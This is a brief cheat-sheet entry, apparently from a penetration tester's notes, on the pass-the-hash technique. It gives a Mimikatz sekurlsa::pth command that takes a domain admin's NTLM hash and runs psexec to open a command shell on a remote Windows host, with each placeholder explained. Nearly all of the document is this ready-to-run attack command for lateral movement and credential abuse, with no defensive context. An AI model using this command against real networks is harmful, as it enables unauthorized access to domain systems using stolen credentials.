# Pass the Hash (PtH)

Open Mimikatz from the admin cmd prompt.

Run the following command:   
```bash
sekurlsa::pth /domain:DOMAIN_NAME /user:DOMAIN_USERNAME /ntlm:USER_NTLM_HASH /run:".\psexec \\REMOTE_HOST_IP -h cmd.exe"
```
 - `DOMAIN_NAME` is the name of the domain e.g. `mydomain.local`.
 - `DOMAIN_USERNAME` is the username of the DA e.g. `oldmate`.
 - `USER_NTLM_HASH` is the NTLM hash of the DA account e.g. `58a478135a93ac3bf058a5ea0e8fdb71`.

A new CMD prompt should open that will be running on the remote host.